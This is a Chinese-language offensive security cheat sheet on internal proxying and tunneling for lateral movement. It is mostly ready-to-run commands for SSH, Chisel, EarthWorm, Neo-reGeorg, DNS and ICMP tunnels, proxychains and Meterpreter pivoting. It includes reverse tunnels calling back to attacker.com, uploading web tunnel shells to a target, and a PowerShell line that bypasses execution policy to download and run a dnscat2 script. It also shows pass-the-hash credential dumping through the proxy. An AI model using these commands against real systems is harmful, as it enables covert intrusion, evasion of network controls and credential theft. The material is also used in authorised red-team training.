---
id: 06-002
title: "🔗 内网代理与隧道 (Internal Proxy & Tunneling)"
category: 横向移动
category_en: "Lateral Movement"
difficulty: ★★★★
tools: "Chisel, FRP, Stowaway, Ngrok, Proxychains"
last_updated: 2025-07
tags: ["lateral-movement", "pivoting", "tunneling", "remote-execution"]
subdomain: lateral-movement
nist_csf: ["DE.CM-04", "PR.AC-05"]
mitre_attack: ["T1021", "T1570", "T1080", "T1550"]
---
# 🔗 内网代理与隧道 (Internal Proxy & Tunneling)

## 概述
在内网环境中搭建代理或隧道，穿透网络隔离，使攻击机能够访问原本无法直接到达的内网资源。

## 核心技能

### 1. SSH隧道

```bash
# 本地端口转发（访问内网服务）
# 将本地的3389端口转发到内网10.0.0.1的3389端口
ssh -L 3389:10.0.0.1:3389 user@jumpbox.com
# 访问: rdesktop 127.0.0.1:3389

# 远程端口转发（暴露内网服务到外网）
# 将目标的80端口转发到攻击机的8080端口
ssh -R 8080:127.0.0.1:80 user@attacker.com

# 动态端口转发（SOCKS代理）
ssh -D 1080 user@jumpbox.com
# 配置proxychains
# /etc/proxychains4.conf: socks4 127.0.0.1 1080
proxychains4 nmap -sT -p 80,443 10.0.0.0/24

# SSH多级隧道（跳板机）
# 通过jumpbox1访问jumpbox2
ssh -J user@jumpbox1:22 user@jumpbox2:22

# SSH配置文件简化
cat ~/.ssh/config
Host jumpbox
    HostName jumpbox.com
    User user
    IdentityFile ~/.ssh/id_rsa
Host internal
    HostName 10.0.0.1
    User admin
    ProxyJump jumpbox

# 使用autossh保持持久连接
autossh -M 20000 -N -L 3389:10.0.0.1:3389 user@jumpbox.com
```

### 2. SOCKS代理

```bash
# Chisel - HTTP隧道
# 服务端（攻击机）
chisel server -p 8080 --reverse

# 客户端（目标机）
chisel client http://attacker.com:8080 R:1080:socks

# 现在攻击机的1080端口就是SOCKS代理
proxychains4 nmap -sT 10.0.0.0/24

# Chisel通过其他协议
chisel client https://attacker.com:8443 R:1080:socks
chisel client wss://attacker.com:443 R:1080:socks

# EarthWorm (EW) - 端口转发
# 正向SOCKS（目标机）
./ew -s ssocksd -l 1080

# 反向SOCKS（攻击机监听）
# 攻击机: ./ew -s rcsocks -l 1080 -e 8888
# 目标机: ./ew -s rssocks -d attacker.com -e 8888

# 多级级联
# 级联A->B->C
# A(外网): ./ew -s lcx_listen -l 1080 -e 8888
# B(跳板): ./ew -s lcx_slave -d A_ip -e 8888 -f C_ip -g 9999
# C(内网): ./ew -s ssocksd -l 9999
```

### 3. HTTP隧道

```bash
# Neo-reGeorg - HTTP隧道
# 服务端生成隧道脚本
python3 neoreg.py generate -k password

# 将生成的tunnel.php上传到目标机

# 客户端连接
python3 neoreg.py -k password -u http://target.com/upload/tunnel.php

# 配置代理
# SOCKS5: 127.0.0.1:1080
proxychains4 rdesktop 10.0.0.1:3389

# reGeorg (旧版)
# 上传对应脚本后
python reGeorgSocksProxy.py -p 1080 -u http://target.com/tunnel.php

# ABPTTS - SSL加密隧道
# 生成隧道脚本
python abpttsfactory.py -o webshells

# 上传后连接
python abpttsclient.py -c webshells/config.txt -u http://target.com/abptts.aspx -f 127.0.0.1:1080/socks
```

### 4. DNS隧道

```bash
# dnscat2
# 服务端（攻击机）
ruby dnscat2.rb --dns "domain=example.com" --no-cache

# 客户端（目标机）
dnscat2-v0.07-client.exe --dns server=example.com

# 或使用PowerShell版
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1'); Start-Dnscat2 -DNSServer example.com"

# iodine - DNS隧道
# 服务端
iodined -f -c -P password 10.0.0.1 tunnel.example.com

# 客户端
iodine -f -P password target_dns_server tunnel.example.com
# 现在可以通过10.0.0.1网络访问内网

# dns2tcp
# 服务端
dns2tcpd -f dns2tcpd.conf -F
# dns2tcpd.conf:
# listen = 0.0.0.0
# port = 53
# user = nobody
# chroot = /tmp
# domain = tunnel.example.com
# resources = ssh:127.0.0.1:22, socks:127.0.0.1:1080

# 客户端
dns2tcpc -r socks -z tunnel.example.com -l 1080 target_dns_server
```

### 5. ICMP隧道

```bash
# ptunnel - ICMP隧道
# 服务端（跳板机）
ptunnel -x password

# 客户端（目标机）
ptunnel -p jumpbox_ip -lp 2222 -da 10.0.0.1 -dp 3389 -c eth0 -x password
# 访问本地2222端口即可连接到10.0.0.1:3389

# PingTunnel
# 服务端
pingtunnel -type server

# 客户端
pingtunnel -type client -l :1080 -s server_ip -sock5 1
# -sock5 1 表示开启SOCKS5代理

# icmptunnel
# 服务端（作为客户端连接到攻击机）
./icmptunnel -s
# 在另一个终端
/sbin/ifconfig tun0 10.0.1.1 netmask 255.255.255.0

# 目标机
./icmptunnel <server_ip>
/sbin/ifconfig tun0 10.0.1.2 netmask 255.255.255.0
```

### 6. 代理链配置

```bash
# proxychains4 配置
cat /etc/proxychains4.conf
# 基本配置
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4 127.0.0.1 1080
socks5 127.0.0.1 1081
http 127.0.0.1 8080

# 使用示例
proxychains4 nmap -sT -Pn -p 80,443,445 10.0.0.0/24
proxychains4 crackmapexec smb 10.0.0.0/24 -u Administrator -H NTLM_HASH
proxychains4 impacket-secretsdump DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# 使用代理配合Metasploit
msf6 > setg Proxies socks5:127.0.0.1:1080
msf6 > setg ReverseAllowProxy true

# 使用代理配合Nmap
nmap -sT -Pn --proxies socks4://127.0.0.1:1080 10.0.0.1

# 多级代理（链式）
# 第一级: SOCKS5 1080
# 第二级: SOCKS5 1081 (通过第一级连接)
# 在proxychains中配置
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

### 7. Meterpreter代理

```msf
# 添加路由
meterpreter > run autoroute -s 10.0.0.0/8
meterpreter > run autoroute -p

# 或者
meterpreter > background
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > set SUBNET 10.0.0.0
msf6 > set NETMASK 255.0.0.0
msf6 > run

# 配置SOCKS代理
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# 通过代理扫描内网
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.0.0.0/24
msf6 > set PORTS 445,3389,8080
msf6 > set THREADS 10
msf6 > run

# 端口转发
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.1
meterpreter > portfwd list
```

## 隧道技术对比

| 技术 | 协议 | 隐蔽性 | 速度 | 适用场景 |
|:---|:---|:---:|:---:|:---|
| SSH隧道 | SSH | 低 | 快 | 有SSH访问 |
| Chisel | HTTP/HTTPS | 高 | 中 | HTTP协议可用 |
| DNScat2 | DNS | 极高 | 慢 | DNS出站未限制 |
| ICMP隧道 | ICMP | 高 | 慢 | 仅ICMP出站 |
| Neo-reGeorg | HTTP | 高 | 中 | Web环境 |
| EarthWorm | TCP | 中 | 快 | 灵活部署 |
| Meterpreter | TCP | 中 | 中 | Metasploit环境 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Chisel | HTTP隧道 | https://github.com/jpillora/chisel |
| EarthWorm | 端口转发代理 | https://github.com/idlefire/ew |
| Neo-reGeorg | HTTP隧道 | https://github.com/L-codes/Neo-reGeorg |
| dnscat2 | DNS隧道 | https://github.com/iagox86/dnscat2 |
| iodine | DNS隧道 | https://github.com/yarrick/iodine |
| ptunnel | ICMP隧道 | https://github.com/utoni/ptunnel-ng |
| ngrok | 反向代理 | https://ngrok.com/ |
| frp | 内网穿透 | https://github.com/fatedier/frp |

## 参考资源
- [HackTricks - Tunneling](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
- [PayloadsAllTheThings - Tunneling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tunneling)
- [SANS - Tunneling Tools](https://www.sans.org/blog/icmp-tunneling/)
- [Chisel Documentation](https://github.com/jpillora/chisel)
